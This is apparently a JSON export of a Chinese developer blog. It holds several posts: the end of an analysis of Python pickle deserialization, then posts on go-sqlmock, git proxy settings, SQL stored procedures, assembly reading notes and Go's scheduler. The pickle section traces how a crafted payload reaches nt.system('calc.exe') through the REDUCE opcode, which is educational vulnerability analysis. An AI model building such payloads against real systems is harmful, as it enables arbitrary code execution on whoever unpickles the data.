\u0026#39;calc.exe\u0026#39;   在BINPUT把nt.system所在的栈记到 memo[0] 后，是一个 BINUNICODE。\n和BININT差不多，压栈一个unicode字符串。\nTUPLE1 1 2  28: q BINPUT 1 30: \\x85 TUPLE1   再次更换栈，TUPLE1从栈顶构造一个元组。\n1 2 3  def load_tuple1(self): self.stack[-1] = (self.stack[-1],) dispatch[TUPLE1[0]] = load_tuple1   这一步将刚压栈的calc.exe构造成了('calc.exe',)。\nREDUCE 1 2  31: q BINPUT 2 33: R REDUCE   将刚构造好的元组记录到memo[2]后，开始 REDUCE 指令。正是这一步触发了任意代码执行。\n1 2 3 4 5 6 7 8  REDUCE = b\u0026#39;R\u0026#39; # apply callable to argtuple, both on stack def load_reduce(self): stack = self.stack args = stack.pop() func = stack[-1] stack[-1] = func(*args) dispatch[REDUCE[0]] = load_reduce   这段代码中args是我们刚构造好的('calc.exe',)，func是nt.system，这个函数的调用结果成为最后留在栈里的对象。\n而我们的恶意代码（弹计算器）也执行了。\n总结 ","date":"2022-06-24T18:11:00+08:00","permalink":"https://nnnewb.github.io/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/","title":"pickle反序列化漏洞浅析"},{"content":"前言 用 DATA-DOG/go-sqlmock 结合 gorm 的简单案例和一些延伸想法。\n为什么mock 使用 mock 技术的主要原因就是确保待测代码的行为稳定，不会因为外部条件变化而造成测试结果不稳定。比如网络延迟或断开、数据库高负载或维护中、你需要的微服务正在被另一个人调试或者你不在内网但急需排查个问题等等。\n开发中这些问题都还好，因为偶发原因失败就失败，排除后测通就行。但一旦单测进入自动化运行的阶段，这些问题就会变得很烦人：测一个服务要启动一整个集群；写用例的时候要考虑支持并发测试提高单测速度；各种偶发故障/平台故障/环境问题/配置错误频繁打断工作流\u0026hellip;\u0026hellip;\n实际体验过亲手写微服务 API 单测然后放 CI 跑这会儿该都是泪。\n构造 GORM.DB 1 2 3 4 5 6 7 8 9  db, mock, err = sqlmock.New() if err != nil { return err } gormDB, err = gorm.Open(postgres.New(postgres.Config{Conn: db})) if err != nil { return err }   gorm.Open的首参数 Dialector是具体数据库驱动，同时也指定了使用的 SQL 方言。go-sqlmock只提供了*sql.DB，所以还需要 Dialector 构造方法支持从 sql.DB 创建。常用的数据库大概都支持。\n控制反转 非常重要的一步，待测代码不能硬编码了数据库实例，不然就没有 mock 的空间了。放 python 里说不定还能 monkeypatch 弥补下，go 里就全看代码架构设计好不好。\ngo 的设计理念之一就是 Composition over inheritance ，不仅体现在类型系统设计上，在组织代码时的体现就是优先用显式装配的方式构造对象，避免使用全局变量等强耦合方式。\n再做一句补充，什么叫强耦合？如果你发现待测功能有一个依赖项没法单测的时候 mock 掉，那多半就是写法强耦合了。\n所以用 mock 写单测还有个好处，就是发现待测代码里不好的设计。当然前提还是单测设计得好的情况下，不管做什么事想搞砸总比想做好容易。\n回到正题，虽然这一小节说 IoC ，但并不是要求用什么 DI 框架，而是指优先用装配的方式显式提供依赖或依赖的工厂函数，避免在待测代码内自行构造依赖对象或引用全局变量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  type B interface { /* ... */ } type BImpl struct { /* ... */ } type A struct { b *B } func NewA(b *B) *A { return \u0026amp;A{ b: b, } } func (*A) method() { NewBImpl().Say() // 强耦合，想再把 B 换成别的东西必须侵入 A 的业务，无法 mock } func (a *A) method2() { a.b.Say() // 弱耦合，可以随便把 b 换成别的类型，单测这个接口时 b 可以替换 }   这种耦合关系还得具体分析，像是业务代码里直接用 gorm.DB 做函数签名，的确对 GORM 形成了强耦合，但 GORM 内部和 gorm.Dialect 又是弱耦合，gorm.Dialect 和 sql.DB 强耦合，sql.DB 和驱动弱耦合。\n于是我们可以选择 mock gorm.Dialect 或 mock 驱动，实际分析来看，gorm.Dialect 大多可以从 sql.DB 构造，mock 掉 sql.DB 就等于 mock 掉了 gorm.Dialect，等于 mock 掉了 gorm.DB，所以 mock sql.DB 收益更好。当然，mock sql.DB 的底层实现还是 mock 驱动。\n和 gorm 构成强耦合不是特别严重的问题（不太可能随便更换 ORM 框架），但能把数据库操作单独抽象出来肯定是更好的，一方面可以单独单测，另一方面出现破坏性变更比如大版本升级时影响范围会更可控，变更结果也可以被已经写好的单测验证。\n例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  package tests import ( \u0026#34;testing\u0026#34; sqlmock \u0026#34;github.com/DATA-DOG/go-sqlmock\u0026#34; \u0026#34;gorm.io/driver/postgres\u0026#34; \u0026#34;gorm.io/gorm\u0026#34; ) func TestMockGORM(t *testing.T) { db, mock, err := sqlmock.New() if err != nil { t.Fatal(err) } gormDB, err = gorm.Open(postgres.New(postgres.Config{Conn: db})) if err != nil { t.Fatal(err) } mock.ExpectQuery(`SELECT \u0026#34;id\u0026#34; FROM \u0026#34;tbl\u0026#34;`).WillReturnRows(mock.NewRows([]string{\u0026#34;id\u0026#34;}).AddRow(1)) results := make([]int, 0) gormDB.Table(\u0026#34;tbl\u0026#34;).Pluck(\u0026#34;id\u0026#34;, \u0026amp;results) if len(results) != 1 { t.Fatal(\u0026#34;应该只有1行结果\u0026#34;) } if results[0] != 1 { t.Fatal(\u0026#34;结果应该是1\u0026#34;) } }   go-sqlmock 也不是完美的，mock 驱动的方案比较烦心的问题就是需要针对每个查询请求添加 ExpectQuery，为了模拟真实环境，还需要WillReturnRows添加返回结果。对于SELECT * FROM tbl 的情况就需要手写一遍字段名和模拟数据，相当啰嗦。可以考虑自己写个助手函数从 gorm 模型生成sqlmock.Rows。\n结论 用 mock 技术写单测成本比较高，收益是单测跑起来稳定不容易意外挂，能并发测试，特别适合自动化跑，测试粒度也更细。\n反之测 API 的话写起来成本比较低，但依赖一整套配套的运行环境（这一成本在系统规模很大或需要自动化频繁跑的时候会很明显），依赖的外部因素比较多容易意外挂，测试粒度比较粗。适合开发阶段写一个，或者大可用 grpcurl 或 postman 一类工具替代。\n以上。\n","date":"2022-06-24T14:38:00+08:00","permalink":"https://nnnewb.github.io/blog/p/go-sqlmock-%E4%B8%8A%E6%89%8B%E8%AE%B0%E5%BD%95%E5%92%8C%E5%BB%B6%E4%BC%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/","title":"go-sqlmock 上手记录和延伸的一些想法"},{"content":"前言 不想再在配置新虚拟机之类的环境的时候临时现查了。\nssh 方式 简而言之，利用 .ssh/config 配置一条 ProxyCommand 即可，linux 下考虑用 nc，windows 非 git bash 可以装个 nmap 用里面带的 ncat 工具，git bash 下可以用 connect 。\nLinux 下用 nc 命令 1 2 3 4 5 6  Host github.com HostName github.com ProxyCommand nc -X 5 -x 127.0.0.1:7891 %h %p Port 22 User git PubKeyAuthentication yes   特别注意 -X 5 表示魔法类型是 s0cks5 ，Windows 下 C 开头的软件在一个端口同时支持了 http 魔法和 s0cks 魔法所以可以直接配同一个端口，Linux 下 C 开头软件社区版是分开监听的，所以别写错了。\nWindows 非 Git Bash 下用 ncat 命令 1 2 3 4 5  Host github.com HostName github.com Port 22 User git ProxyCommand C:/Users/USER/scoop/shims/ncat.exencat --proxy 127.0.0.1:7890 %h %p   特别注意路径，ncat使用完整路径，而且不要用反斜杠，用正斜杠。\nWindows Git Bash 下可以用 connect 命令 1 2 3 4 5  Host github.com HostName github.com Port 22 User git ProxyCommand connect -S 127.0.0.1:7890 %h %p   没用过，不知道有什么坑。\nhttps 方式 在 ~/.gitconfig 里这样配置。\n1 2  [http \u0026#34;https://github.com\u0026#34;] proxy = socks5://192.168.10.120:7890   魔法类型和端口注意改成自己的。\n总结 如果不是工作需要，麻瓜大可用 gitee 一类的服务，反正免费私有仓库对个人把玩用途绝对够了。\nPages 的话最好走正规渠道。\n","date":"2022-06-23T17:50:00+08:00","permalink":"https://nnnewb.github.io/blog/p/git-magic-surfing-skill/","title":"git魔法上网的技巧"},{"content":"前言 工作里很少用到这些功能，备考数据库系统的时候发现这几个不是考点的地方确实还得现查文档才能写。\n因为不考又不怎么用，所以本篇只是简短地记一下储存过程、函数和触发器写法，没深度，也不适用于做备考资料。仅仅是给自己扫盲。\n储存过程 是什么？ 这是个很容易引起误解的名字，英文是 Stored Procedure，也就是被储存的（Stored）过程（Procedure）。一翻译感觉像是说储存这个动作的过程一样。\n什么时候用？ 参考一个爆栈的回答 MySQL stored procedures use them or not to use them ，储存过程本身不像一般的编程语言中所谓的过程，它有很多缺陷。\n 不可移植。这意味着可能出现 vendor lock-in 的风险。 难以测试、更新、维护，缺乏支持，没有日志、跟踪、调试信息。甚至很难和 VCS 工具打配合。 不容易和其他技术整合。 参考文档，发现在开启binlog时创建储存过程还需要高特权。  而储存过程常被鼓吹的优势：高性能，就是个谜。老话说提前优化是万恶之源，储存过程的“高性能”本身也不是免费午餐，除非真的 真的 需要，非它不可，没有替代方案，而且充分考虑过开发、管理、维护储存过程带来的额外复杂性，再选择用储存过程也不迟。\n怎么用？ 定义储存过程的语法\n1 2 3 4 5 6 7  -- CREATE PROCEDURE \u0026lt;proc\u0026gt;([parameters[, ...]]) CREATEPROCEDUREproc(uidINT)BEGIN-- PROCEDURE BODY -- ordinary SQL query UPDATEcustomerSETgoodie=1WHEREcuid=uid;END  对，储存过程没有返回值。所以必要的时候可以用关键字IN和OUT修饰参数，来传递变量。类似 C# 的 out、ref 关键字。微软文档也喜欢在函数签名里加 IN 或 OUT 的宏来标识参数会不会被覆写。不过其他编程语言里就少见了，更提倡用返回值显式传递。\n1 2 3 4 5 6 7 8 9  CREATEPROCEDUREproc(INuidINT,OUTgoodieINT)BEGINSELECTgoodieINTOgoodieFROMcustomerWHEREcuid=uid;ENDCALLproc(@goodie);SELECT@goodie;DROPPROCEDUREIFEXISTSproc;  在BEGIN前面还可以加一些修饰，比如COMMENT。常见的是DETERMINISTIC，这个关键字表示过程输出是稳定的，对同一个参数总是输出同样的结果，对数据库内部优化查询有用，大概。默认是NOT DETERMINISTIC。\n函数 是什么？ 类似储存过程，但有返回值。\n什么时候用？ 问题和储存过程类似，不再赘述。\n怎么用？ 1 2 3 4 5 6 7 8 9  CREATEFUNCTIONfunc([IN|OUT]paramtype)RETURNStypeBEGINbodyENDSELECTfunc(cuid)FROMcustomers;DROPFUNCTIONIFEXISTSfunc;  创建语法和储存过程类似，使用时不需要 CALL，而是和普通 SQL 函数一样。\n触发器 是什么？ 触发器是一个和表关联的数据库对象，在特定事件发生时激活。不能在临时表（使用TEMPORARY关键字的CREATE TABLE语句创建的表）上创建触发器。\n什么时候用？ 如果按数据库系统原理这门课上的考点来说，触发器可以帮助保持数据完整性。但现实世界很少有这么干的，除了上面提到的储存过程和函数都存在的缺陷之外，设计不好的触发器也可能造成性能问题。\n所以老样子，除非真的非它不可，不然敬而远之就是了。\n怎么用？ 1 2 3 4 5  CREATETRIGGERtrigger_name{BEFORE|AFTER}{INSERT|UPDATE|DELETE}ONtbl_nameFOREACHROW[{FOLLOWS|PRECEDES}other_trigger_name]body  一个考点是触发器只能对DML中增删改事件做出反应。\n总结 水了将近1000字。\nSQL知识里一块空白给填上了，强迫症一本满足。\n","date":"2022-06-16T10:34:59+08:00","permalink":"https://nnnewb.github.io/blog/p/stored-procedure-function-and-triggers/","title":"储存过程、函数和触发器"},{"content":"前言 本来想继续前篇八股写GC的博客，但花了一天多的时间读mgc.go还有推荐的那本 GC handbook 发现还真不是一句两句话能讲清楚GC设计背后的理论。特别是关于写屏障的作用和如何生效这块尤其难读，go是个有编译器配合打辅助的GC，写屏障并不全在 runtime，还涉及编译时插入的代码，要深入还得分析 go 的内存模型巴拉巴拉 \u0026hellip;\n但背八股就和这个没关系了，八股不用去看mgc.go也不用分析编译器怎么插入的写屏障。\n总而言之，时隔那么多天之后，决定把一本以前读过一点的书捡起来继续读，顺便做下读书笔记。书叫做 Programming from the Ground Up ，我看没中译本所以瞎叫它程序平地起，无所谓啦。\n书是开源的，开源协议 GNU Free Documentation License，成书于 2004 年，目前处于 Production/Stable 状态。网站地址。讲道理还别嫌旧，王爽那本汇编语言还是 03 年发的初版，我也读过，讲道理门槛还是有点高不好实践的，毕竟上手就跟你讲一大堆理论和实模式下编程你就配个环境都要花不少时间\u0026hellip;\u0026hellip;\n这本 PGU 起码是用户态开始了，C语言会吧，把return 0换成movl $0, %eax总能读懂了吧，从编译链接这些更贴近已有知识的地方开始学起我个人感觉是学习曲线平滑了很多，不至于一章劝退，乐趣也多很多。\n那废话不多说啦，这书300多页，快速过一下已经看过的部分。\n语法 AT\u0026amp;T vs Intel 之前说学过王爽那本汇编语言，和 PGU 这书最明显的区别可能就是用了不同的汇编语法。PGU用的是 AT\u0026amp;T 语法，形如movl $0,%eax，Intel 语法就是 mov eax, 0 。\nAT\u0026amp;T 语法一方面多了很多符号$ %看起来比较“脏”，另一方面操作数顺序和 Intel 语法是反的。\n这里稍微逼逼两句，语法这个东西能读能写就完了，没有谁家真的是完全照着什么specification设计的语言，扩展数不胜数。比如学王爽那本的时候我用的不是 masm 而是 nasm ，大部分东西一样，不同的地方翻文档。汇编就是一套助记符，语言律师在高级语言里没前途在汇编里也没前途。\n寻址模式和语法 除了立即数和寄存器两种寻址模式稍特殊一点，后续的寻址模式在AT\u0026amp;T（我还是直接说 GCC 汇编吧）语法里都遵循一个一般形式。\n1  ADDRESS_OR_OFFSET(%BASE_OR_OFFSET,%INDEX,MULTIPLIER)   里面的所有字段都是可选的，地址的计算公式是：\n1  FINAL ADDRESS = ADDRESS_OR_OFFSET + %BASE_OR_OFFSET + MULTIPLIER * %INDEX   例如，4(%eax) 就是 4 + %eax + 0 * 0。%eax(,1,4) 就是 %eax + 0 + 1 * 4。\n立即数 immediate mode 和寄存器 register addressing mode 立即数寻址模式形如$123，$开头，就是立即数。\n寄存器寻址模式形如%eax，以%开头后面跟寄存器名字。\n直接寻址 direct addressing mode 参考上述的一般形式，直接寻址就是只给出 ADDRESS_OR_OFFSET 字段。\n在指令里直接给出地址，比如movl 400010, %eax 就是把地址 400010 处 4 个字节复制到寄存器 eax 。\n索引寻址 indexed addressing mode 参考一般形式，索引寻址模式就是给出 ADDRESS_OR_OFFSET(,%INDEX,MULTIPLIER) 这样的地址。\n例如 movl %eax(,0,4), %eax 相当于是 %eax 指向一个 int32 数组，取这个数组第一个元素赋值给%eax，eax = eax[0]。以此类推，movl %eax(,1,4), %eax 就是 eax = eax[1] 。\n间接寻址 indirect addressing mode 参考一般形式，间接寻址就是只给%BASE_OR_OFFSET字段。\n间接寻址模式下指令包含一个保存指向数据的指针的寄存器，比如movl (%eax),%ebx。\n基指针 base pointer addressing mode 和间接寻址类似，指针+偏移值，如movl 4(%eax), %eax。\n函数、栈、系统调用 栈 说调用约定一般会讲 C calling conventions cdecl 的吧，特点是调用方清栈。但继续之前必须先说栈，因为好久没看汇编连进程的内存布局都快忘了。\n这部分可以参考 APUE (Advanced Programming in the UNIX Environment) 一书第七章第六小节 C 程序的存储空间布局。\n之前看 Windows PE 文件结构的时候提到 PE 文件的节表写了PE文件里的节映射到具体哪个地址上，Linux ELF 文件的节表也有 sh_addr 这样的属性指定映射到内存的哪个位置。在 gdb 里可以用 maintenance info sections 指令查看节映射到的内存地址。另外和 Windows PE 文件一样，Linux 下 ELF 也有 ASLR 和重定位，两者历史包袱还是挺接近的。\n总之，这个布局图可供参考。比较重要的是图中的 stack 和 heap 增长方向。stack 往低地址增长，意味着要扩展栈需要的指令就是 subq $8, %rsp 这样的形式，回缩就是 addq。\n另外个人觉得比较有趣的一点是，因为栈是往低地址增长的，但栈上开个数组之类的情况，布局反而是从低到高。这也意味着大多时候出现越界读写，都是从低地址往高地址方向的越界，影响栈帧和更高地址上的环境变量。如果把栈设计为从低到高，那越界读写的威胁是否就小很多呢。\n扯远了。\n函数和栈帧 汇编不像是其他高级语言，将函数视作一个客观、规范的语言结构，汇编里的函数是人为定义的概念，只是一段独立的汇编代码，被称作“函数”而已。\n函数调用就是pushq %rsp加上jmp；返回就是popq %rsp再jmp，再加上可选的 addq $..., %rsp，仅此而已。但如果要这样说的话未免有点太不负责任了。还是看一个实例吧，从PGU这书的例子改出来的 x86-64 版本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  .section .text .globl _start _start: pushq $1 pushq $2 call add pushq %rax call exit_syscall add: pushq %rbp movq %rsp, %rbp movq $0, %rax addq 16(%rbp), %rax addq 24(%rbp), %rax popq %rbp ret $16 exit_syscall: movq 8(%rsp), %rdi movq $60, %rax syscall   除了 _start 是个特殊的标签用来标识程序入口外，add和exit_syscall都是所谓的“函数”。其中add我尝试用stdcall约定（被调方清栈）来编写。\n可以亲手用 gdb 调试一下上面的程序，观察栈的变化。\n还是说栈帧。栈帧是一个人为定义的概念，就和函数一样。从函数出发我们可以看到一个函数的上下文包括：返回地址、参数、局部变量，把这些东西在栈上排列好：\n其中参数和返回地址由调用方 caller 通过 push 和 call 指令传入，局部变量由函数自己sub $24,%rsp开辟。\n中间有个可能造成误会的地方是 %ebp 寄存器为什么没在布局里画出来，根据 System V Application Binary Interface Intel386 Architecture Processor Supplement 中 Figure 3-15 可以看到这是可选的。\n系统调用 系统调用和普通函数调用有很大不同，造成不同的内在原因等我啥时候读讲操作系统的书的时候再说。这里就单独看下调用约定。\n一般的进程内函数调用都是直接 call func，已知call其实就是压栈返回地址加上无条件跳转，仅此而已，但系统调用完全不同，因为OS的代码压根不在用户进程的虚拟地址空间里，想跳也无处可跳。用户代码里想调用内核直接提供的接口就需要一些特殊方法。\n int 0x80 软中断法实现 AMD64 提供的 syscall 指令实现  系统调用自然也有调用约定，确定要调用哪个函数，如何传递参数，如何取得返回值。这方面不同OS规范不一样，Linux 遵循 System V ABI 规范（注意不同处理器架构规范也有差异）。\n对于AMD64架构使用 syscall 指令进入系统调用（System V Application Binary Interface x86-64 Architecture Processor Supplement Draft Version 0.95 - A.2 AMD64 Linux Kernel Conventions - Calling Conventions）参数传递顺序如下：\n   位置 含义     %rax 系统调用号   %rdi 参数 #1   %rsi 参数 #2   %rdx 参数 #3   %r10 参数 #4   %r8 参数 #5   %r9 参数 #6    值得注意的是，调用约定中限制了整个系统调用最多不超过 6 个参数，全部都放在寄存器里，没有参数通过栈传递。另外，内核会破坏 %rcx 和 %r11 两个寄存器的内容，所以如果这两个寄存器需要调用方自己保存到栈上。\nIA32 架构用 int 0x80 软中断实现系统调用（没找到具体规范），%eax传递调用号，%ebx, %ecx, %edx, %esi, %edi, %ebp 六个寄存器用于传递参数，同样限制系统调用最多不超过6个参数。\n知道这些之后就可以用系统调用 write 写一个简单的 Hello world 了。\n实验 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  .section .data helloworld: .ascii \u0026#34;Hello world\\n\u0026#34; helloworld_end: .equ helloworld_len, helloworld_end - helloworld .equ SYS_WRITE,1 .equ STDOUT,1 .section .text .globl _start _start: movq $SYS_WRITE, %rax # write movq $STDOUT, %rdi # int fd movq $helloworld, %rsi # char* buf movq $helloworld_len, %rdx # size_t len syscall # call _exit() movq %rax, %rdi movq $60, %rax syscall   用 gdb 单步调试，在第一个 syscall 前后可以看到这样的结果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  (gdb) l 10 _start: 11 movq $SYS_WRITE, %rax # write 12 movq $STDOUT, %rdi # int fd 13 movq $helloworld, %rsi # char* buf 14 movq $helloworld_len, %rdx # size_t len 15 syscall 16 17 # call _exit() 18 movq %rax, %rdi 19 movq $60, %rax (gdb) i r $rsi rsi 0x402000 4202496 (gdb) i r $rdi rdi 0x1 1 (gdb) i r $rdx rdx 0xc 12 (gdb) x/s $rsi 0x402000: \u0026#34;Hello world\\n\u0026#34; (gdb) ni Hello world 18 movq %rax, %rdi   用file命令可以看到编译后的文件信息：\n1 2  $ file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped   总结 了解怎么用系统调用后，就能很大程度发挥想象了。\n这篇读书笔记卡了我一个星期，本来计划读GC那本书也没读，PGU原书讲的也是 x86，和 x86-64 有些不同的地方，直接套用先前学汇编的时候 nasm 的一丁点经验对学习的帮助也有限。\n光是找 System V ABI 规范文档和文档里关于系统调用的约定就花了一下午不止，最后还没找到 32 位 INT 0X80 到底哪儿规定的。\n随着拿到新工作的 offer，事情忽然就开始堆积起来了。数据库系统原理的网课讲得稀烂，只能靠自己刷题。马原自从看完之后也没复习和刷题。10月不知道能报上几门。工作上一边要交接，一边要把剩下的一个大功能捋清楚。偏偏这功能产品部还火急火燎要在6月底前上线，还刚好卡在我提离职后让我干。明知这功能铁定全是坑也没辙了，选了个最保守的技术方案，别等我闪人了再搞出大问题让我救火就行。\n至于博客，想水两篇还是有机会的，但偏偏想学的东西都不是好水的。GC那书偏理论，浅尝辄止那就跟抄书没两样，结合实践那就不是一两天能调试好的。PGU这书倒是很实践，但偏偏我又是个实践的时候喜欢钻牛角尖的，没事儿非要找个规范或者依据出来。即便如此博客还是口胡居多。\n我寻思是不是应该多写点没那么多抱怨的生活内容，比如给周末刷的电影和动画写个观后感什么的。\n六月第一篇博客拖到了14号才发，就先这样吧。\n","date":"2022-06-14T10:38:47+08:00","permalink":"https://nnnewb.github.io/blog/p/programming-ground-up-read-note-01/","title":"程序平地起-读书笔记"},{"content":"前言 应付面试做的准备吧。当然单纯背书也没意思，所以还是结合源码尝试去理解。\nGMP 模型 一图概述 G、M、P之间的关系 G=goroutine，毫无疑问。G本身维护了一个跟踪它自己执行状态的结构。\nP=Logical Processors，可以被视作一种抽象的资源或上下文，需要被OS线程M获取后，M才能执行G。\nM=OS Thread，取得P后，弹出P队列中的G并执行。\n这是一个很简化的说法，实际G、M、P之间的交互有很多复杂的细节。\nGo程序的启动 八股 M0是编号0的主线程，在全局变量runtime.m0中，不需要在堆上分配。M0负责初始化和启动第一个G，之后M0就和其他M一样了。\nG0是每次启动M第一个创建的goroutine。G0仅负责调度，不指向任何可执行的函数，每个M都有自己的G0。可以这样看：G0=调度器循环。\n启动G0后开始正常调度，运行main.main。\n实践 网上有很多 go 程序分析的文章，一个基本的点是 go 程序入口点在 rt0_\u0026lt;os\u0026gt;_\u0026lt;arch\u0026gt;.s 里，我们对照 go 编译器吐出来的汇编和 x64dbg 读。先准备一个最简单的程序。\n1 2 3 4 5 6 7 8  package main func main() { println(\u0026#34;Hello world!\u0026#34;) } // $env:GOARCH=386 // go build main.go   386架构的入口汇编如下。\n1 2 3  // rt0_windows_386.s TEXT _rt0_386_windows(SB),NOSPLIT,$0 JMP\t_rt0_386(SB)   对应的汇编\n跳转到 _rt0_386\n1 2 3 4 5 6 7 8 9 10 11  // asm_386.s // _rt0_386 is common startup code for most 386 systems when using // internal linking. This is the entry point for the program from the // kernel for an ordinary -buildmode=exe program. The stack holds the // number of arguments and the C-style argv. TEXT _rt0_386(SB),NOSPLIT,$8 MOVL\t8(SP), AX\t// argc LEAL\t12(SP), BX\t// argv MOVL\tAX, 0(SP) MOVL\tBX, 4(SP) JMP\truntime·rt0_go(SB)   在调试器跟到汇编如下。\n接着我们看 runtime.rt0_go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  TEXT runtime·rt0_go(SB),NOSPLIT|NOFRAME|TOPFRAME,$0 // 一大堆初始化和检查代码，略 ok: // set up m and g \u0026#34;registers\u0026#34; get_tls(BX) LEAL\truntime·g0(SB), DX MOVL\tDX, g(BX) LEAL\truntime·m0(SB), AX // save m-\u0026gt;g0 = g0 MOVL\tDX, m_g0(AX) // save g0-\u0026gt;m = m0 MOVL\tAX, g_m(DX) CALL\truntime·emptyfunc(SB)\t// fault if stack check is wrong // convention is D is always cleared CLD CALL\truntime·check(SB) // saved argc, argv MOVL\t120(SP), AX MOVL\tAX, 0(SP) MOVL\t124(SP), AX MOVL\tAX, 4(SP) CALL\truntime·args(SB) CALL\truntime·osinit(SB) CALL\truntime·schedinit(SB) // create a new goroutine to start program PUSHL\t$runtime·mainPC(SB)\t// entry CALL\truntime·newproc(SB) POPL\tAX // start this M CALL\truntime·mstart(SB) CALL\truntime·abort(SB) RET   几个关键节点大概谈一下。\n第一个是关于m和g，看过proc.go会发现很多地方调了一个迷之函数getg，注释里写道由编译器插入实现，从寄存器或者Thread Local Storage 取当前 G 指针。看代码：\n1 2 3 4 5 6 7 8 9 10  // set up m and g \u0026#34;registers\u0026#34; get_tls(BX) LEAL\truntime·g0(SB), DX MOVL\tDX, g(BX) LEAL\truntime·m0(SB), AX // save m-\u0026gt;g0 = g0 MOVL\tDX, m_g0(AX) // save g0-\u0026gt;m = m0 MOVL\tAX, g_m(DX)   这里把当前的g设置为了g0，并且关联到m0。\n第二是 schedinit，里面调用了 procresize ，从 allp 获取到 p 绑定到了 m0 上。\n再然后是在初始化之后看到一个 newproc 的调用，传入参数 mainPC，也就是 runtime·main 函数的地址。newproc 把 runtime.main 函数包装成 G 放进可运行的队列中，具体的请读源码newproc和newproc1。\n这里插一嘴，runtime.main 函数里启动了我们的 main.main 函数，也就是我们平时代码的入口点就在这了。\n但到底为止还没有出现调度代码，我们继续看接下来调用的mstart\n1 2 3 4 5 6  // start this M CALL\truntime·mstart(SB) TEXT runtime·mstart(SB),NOSPLIT|TOPFRAME,$0 CALL\truntime·mstart0(SB) RET // not reached   mstart是mstart0的别名，mstart0是一个 go 函数，里面除了初始化 g 的栈之外就是调用了 mstart1，mstart1依然是一个go函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  // The go:noinline is to guarantee the getcallerpc/getcallersp below are safe, // so that we can set up g0.sched to return to the call of mstart1 above. // //go:noinline func mstart1() { _g_ := getg() if _g_ != _g_.m.g0 { throw(\u0026#34;bad runtime·mstart\u0026#34;) } // Set up m.g0.sched as a label returning to just \t// after the mstart1 call in mstart0 above, for use by goexit0 and mcall. \t// We\u0026#39;re never coming back to mstart1 after we call schedule, \t// so other calls can reuse the current frame. \t// And goexit0 does a gogo that needs to return from mstart1 \t// and let mstart0 exit the thread. \t_g_.sched.g = guintptr(unsafe.Pointer(_g_)) _g_.sched.pc = getcallerpc() _g_.sched.sp = getcallersp() asminit() minit() // Install signal handlers; after minit so that minit can \t// prepare the thread to be able to handle the signals. \tif _g_.m == \u0026amp;m0 { mstartm0() } if fn := _g_.m.mstartfn; fn != nil { fn() } if _g_.m != \u0026amp;m0 { acquirep(_g_.m.nextp.ptr()) _g_.m.nextp = 0 } schedule() }   而mstart1中我们看到最后一句就是最重要的schedule()，这个函数会从可运行队列里取一个g并开始执行。在这个场景下，我们只有另一个g，runtime.main。经过schedule后，主线程就从g0，也就是刚才的调度代码，切换到了runtime.main，我们的用户代码中。\n调度策略 八股  G运行超过一定时间则换其他任务运行 G同步系统调用阻塞则M和G继续挂起等待，P绑定新的M继续运行 G网络调用则挂到netpoller队列里等待，M继续调度其他G运行。 P没有任务的时候会尝试从全局队列和其他P的本地队列偷取G来运行。  sysmon、抢占、handoff 在runtime.main里，go 在启动main.main之前，除了wasm之外都会先启动一个叫sysmon的M，这个M只负责运行调度。\n在sysmon函数里可以看到一个retake调用和注释\n1 2 3 4 5 6 7  // retake P\u0026#39;s blocked in syscalls // and preempt long running G\u0026#39;s if retake(now) != 0 { idle = 0 } else { idle++ }   retake函数里检查调用时间，处理两种场景：\n 在同步系统调用状态，而且运行了很长时间 G已经运行了很长时间  1 2 3 4 5 6 7 8 9 10 11 12 13  if s == _Prunning || s == _Psyscall { // Preempt G if it\u0026#39;s running for too long.  t := int64(_p_.schedtick) if int64(pd.schedtick) != t { pd.schedtick = uint32(t) pd.schedwhen = now } else if pd.schedwhen+forcePreemptNS \u0026lt;= now { preemptone(_p_) // In case of syscall, preemptone() doesn\u0026#39;t  // work, because there is no M wired to P.  sysretake = true } }   观察到，当pd.schedwhen+forcePreemptNS \u0026lt;= now，也就是这个G已经运行了超过forcePreemptNS（常量，10毫秒）这么久时，使用preemptone来通知M换一个G运行。\n但是在同步系统调用的状态下，preemptone不起效，这里做了个简单的标记，在之后的代码中我们会看到如何处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  if s == _Psyscall { // Retake P from syscall if it\u0026#39;s there for more than 1 sysmon tick (at least 20us).  t := int64(_p_.syscalltick) if !sysretake \u0026amp;\u0026amp; int64(pd.syscalltick) != t { pd.syscalltick = uint32(t) pd.syscallwhen = now continue } // On the one hand we don\u0026#39;t want to retake Ps if there is no other work to do,  // but on the other hand we want to retake them eventually  // because they can prevent the sysmon thread from deep sleep.  if runqempty(_p_) \u0026amp;\u0026amp; atomic.Load(\u0026amp;sched.nmspinning)+atomic.Load(\u0026amp;sched.npidle) \u0026gt; 0 \u0026amp;\u0026amp; pd.syscallwhen+10*1000*1000 \u0026gt; now { continue } // Drop allpLock so we can take sched.lock.  unlock(\u0026amp;allpLock) // Need to decrement number of idle locked M\u0026#39;s  // (pretending that one more is running) before the CAS.  // Otherwise the M from which we retake can exit the syscall,  // increment nmidle and report deadlock.  incidlelocked(-1) if atomic.Cas(\u0026amp;_p_.status, s, _Pidle) { n++ _p_.syscalltick++ handoffp(_p_) } incidlelocked(1) lock(\u0026amp;allpLock) }   